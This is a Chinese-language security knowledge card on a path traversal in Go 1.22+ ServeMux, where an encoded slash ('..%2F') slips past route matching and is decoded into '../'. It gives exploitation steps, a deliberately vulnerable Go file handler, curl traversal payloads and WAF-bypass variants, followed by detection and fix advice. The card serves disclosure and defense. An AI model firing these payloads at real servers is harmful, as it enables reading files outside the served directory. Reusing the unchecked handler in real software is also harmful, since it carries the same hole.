---
id: web-golang-servemux-encoded-slash-path-traversal
title: Go 1.22+ ServeMux 编码斜杠 %2F 双视图解析导致路径穿越读取
type: scenario
domain: web
path: web/golang
technique: servemux-encoded-slash-dual-view-traversal
aliases:
- Go ServeMux 编码斜杠穿越
- '%2F path traversal'
- EscapedPath 路径穿越
- PathValue 解码穿越
- Go 双视图解析
tags:
- go
- servemux
- path-traversal
- encoded-slash
- percent-encoding
- go1.22
- path-normalization
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: Go 1.22 及之后（Go 1.21 及更早不复现）
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:49:58+08:00'
  notes: 已对照原文核对：Go1.22+ ServeMux 按 EscapedPath 匹配、%2F 不切段，PathValue 解码交付 ..；38张截图含 muxdump/filesrv/旧版301对照/GODEBUG A/B/authz/nuclei，filepath.Join 读出 TRAVERSAL_SECRET。版本按原文标记 Go1.22 及之后、Go1.21 及更早不复现。未执行PoC
---

## 一句话结论

Go 1.22 起 `net/http.ServeMux` 按编码视图 `EscapedPath()` 逐段匹配，`%2F` 不被视为段分隔符；`/files/..%2Fsecret.txt` 因而命中 `/files/{name}` 单段通配，`PathValue("name")` 再按解码视图交付 `../secret.txt`，处理器用该值拼接磁盘路径时 `..` 回退语义恢复，越出根目录读取任意文件。

## 原理

- `net/url.Parse` 同时保留两个路径字段：`Path` 是百分号解码后的路径，`RawPath` 仅在编码形态与默认转义结果不一致时保留原始转义；`EscapedPath()` 在存在 `RawPath` 时返回 `RawPath`。
- Go 1.22 的 `findHandler` 用 `cleanPath(r.URL.EscapedPath())` 做路径规整和逐段匹配（`net/http/server.go` 2679 行附近）；`cleanPath` 只识别明文 `.`/`..` 段，对 `%2F`、`%2e` 这类编码无感。于是 `/files/..%2Fsecret.txt` 在匹配视图里是两段 `[files, ..%2Fsecret.txt]`，`/files/{name}` 的单段通配整体捕获第二段。
- 命中后，通配捕获值按解码视图交付：`PathValue("name")` 和 `r.URL.Path` 都是 `../secret.txt`。处理器若用 `filepath.Join(root, name)` 或直接字符串拼接构造磁盘路径，`..` 的目录回退语义恢复，路径越出 `root`。
- 关键分裂：**匹配层信任编码视图，交付层信任解码视图**。同一请求在两份视图里各自"合法"，没有任何一层把两者组合起来校验。
- 旧版 Go 1.21 在匹配前对解码后的 `r.URL.Path` 做 `cleanPath`（`servemux121.go` 121 行），`%2F` 已被解码成 `/`，`..` 段随即被折叠并触发 301，穿越载荷到不了处理器；Go 1.22 的规整只作用于编码视图字符串，因此构成回归面。
- 补充观察：CONNECT 请求在 `findHandler` 中跳过 canonicalize（`server.go` 2663-2675），不做 `cleanPath`，但仍按 `EscapedPath()` 匹配、逐段解码，说明双视图分裂是匹配管线的通用属性，不依赖 HTTP 方法；GET 的 `cleanPath` 折叠只影响明文点段。
- `cleanPath` 对 `%2e%2e`、`.%2e` 同样无感；这些编码点段在编码视图里不被折叠，解码后 `..` 直接进入交付字段。

## 触发条件

- 使用 Go 1.22 及之后的 `net/http.ServeMux` 路由。
- 路由模式包含单段通配 `{name}`（或其它会捕获 `..%2F...` 整段的前缀/通配模式）。
- 处理器用 `r.PathValue("name")`、`r.URL.Path` 等解码值拼接文件系统路径，且未做归一化与根目录边界校验。
- 目标端点无需认证即可访问，或认证后仍可越权读取树外文件。

## 利用步骤

1. 确认目标为 Go 1.22+ 的 `net/http` 服务，并找到一个把路径参数用于文件读取的路由，例如 `/files/{name}`。
2. 先请求正常文件，确认路由与文件根目录：`GET /files/welcome.txt`。
3. 把穿越段编码进单段：`GET /files/..%2Fsecret.txt`。匹配层看到一段 `..%2Fsecret.txt`，命中通配；交付层解码为 `../secret.txt`。
4. 处理器拼接 `root + ../secret.txt` 后越过根目录，返回树外文件内容。
5. 若被 WAF 或前置代理按"`%2F` 是斜杠"拦截，尝试 `.%2e`、`%2e%2e`、双重编码 `%252F`、`%5C` 等变体，或改用 CONNECT 观察是否绕过 `cleanPath` 折叠。

## PoC

最小路由与处理器：

```go
package main

import (
    "fmt"
    "log"
    "net/http"
    "os"
    "path/filepath"
)

const root = "/home/nl/srvfiles" // welcome.txt 在此，secret.txt 在上级目录

func serve(w http.ResponseWriter, r *http.Request) {
    name := r.PathValue("name")    // 解码后的捕获值，含 ../ 原样交付
    p := filepath.Join(root, name) // 拼接并归一化，.. 越出 root
    data, err := os.ReadFile(p)
    if err != nil {
        fmt.Fprintf(w, "ERR(404) name=%q path=%s err=%v\n", name, p, err)
        return
    }
    fmt.Fprintf(w, "OK(200) name=%q path=%s body=%s\n", name, p, data)
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/files/{name}", serve)
    log.Fatal(http.ListenAndServe("127.0.0.1:8110", mux))
}
```

```bash
# 正常读取
curl -i 'http://127.0.0.1:8110/files/welcome.txt'
# -> OK(200) name="welcome.txt" path=/home/nl/srvfiles/welcome.txt body=PUBLIC_FILE_OK

# 编码斜杠穿越
curl -i 'http://127.0.0.1:8110/files/..%2Fsecret.txt'
# -> OK(200) name="../secret.txt" path=/home/nl/secret.txt body=TRAVERSAL_SECRET
```

观测匹配与交付差异的最小 dump：

```go
mux.HandleFunc("/files/{name}", func(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "HIT [%s] name=%q Path=%q RawPath=%q EscapedPath=%q\n",
        r.Pattern, r.PathValue("name"), r.URL.Path, r.URL.RawPath, r.URL.EscapedPath())
})
```

```text
GET /files/..%2Fsecret.txt
HIT [/files/{name}] name="../secret.txt"
Path="/files/../secret.txt" RawPath="/files/..%2Fsecret.txt"
EscapedPath="/files/..%2Fsecret.txt"
```

## 变体与关联

- 变体：`%2e%2e`、`.%2e` 等编码点段不被 `cleanPath` 折叠，解码后恢复 `..`；`GET /files/.%2e/secret.txt` 在编码视图是 3 段，超出单段通配而落根，但 `/%2e%2e/secret.txt` 等模式仍可命中。
- 变体：双重编码 `%252F`；首次解码为 `%2F`，是否再次解码取决于处理器与中间件，需按目标实现验证。
- 变体：CONNECT 不经过 `cleanPath`，可在 GET 被折叠时用 CONNECT 观察匹配层行为；但真实利用仍受前置代理对 CONNECT 的支持限制。
- 变体：`GODEBUG=httpmuxgo121=1` 可把同一二进制的匹配语义切回 1.21 兼容层，`..` 在匹配前被折叠、返回 301，可作为 A/B 对照确认根因在 ServeMux 而非处理器。
- 变体：WAF/第三方框架（如 gin/echo）把 `%2F` 当斜杠切段，而 Go 1.22 ServeMux 不当斜杠，WAF 看到的段集合与路由实际匹配的段集合不同，形成解析器分歧绕过。
- 关联：[[web-golang-escaped-vs-decoded-path-authz-bypass]] 讲同一双视图在授权中间件上的表现；本卡聚焦文件读取交付层。

## 检测与防御

- 检测：请求路径中出现编码分隔符 `%2F`、`%5C`（含大小写）、编码点段 `%2e`、双重编码 `%25`；同一 URL 的 `EscapedPath` 与 `Path` 段数或归一化结果不一致。
- 检测：应用日志中 `PathValue`/`URL.Path` 含 `..`，或最终文件路径位于配置根目录之外。
- 修复：文件服务内显式归一化——拼接前 `filepath.Clean`，并断言结果仍以根目录为前缀，越界一律 404。
- 修复：入口中间件拒绝或规范化编码分隔符；检查 `r.URL.RawPath` 与 `r.RequestURI`，不要只检查 `Path`。
- 修复：优先使用 `http.FileServer` + `http.Dir`、`fs.ValidPath` 或 `io/fs` 子文件系统等安全原语，避免自研路径拼接。
- 统一视图：授权、路由、交付必须基于同一份解析结果，不要把"匹配用编码视图、交付用解码视图"的组合当作整体安全。
- 加固：审计 `GODEBUG=httpmuxgo121=1` 的使用，避免局部降级改变全局匹配语义；升级 Go 时对路径类路由做回归测试。
- 回归：用 `..%2F`、`%2e%2e`、`%252F`、`%5C` 用例断言穿越被拒绝，并验证返回路径始终位于根目录内。
